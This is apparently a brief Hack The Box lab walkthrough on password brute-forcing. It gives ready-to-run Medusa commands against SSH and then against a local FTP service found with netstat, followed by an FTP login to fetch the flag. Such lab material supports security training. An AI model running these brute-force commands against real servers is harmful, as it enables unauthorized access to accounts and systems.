## **Web Services**

We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically. The following command serves as our starting point:

```
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

**Expanding the Attack Surface**

Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

```
00Luffy00@htb[/htb]$ netstat -tulpn | grep LISTEN
```

**Targeting the FTP Server**

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

**Retrieving The Flag**

```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```
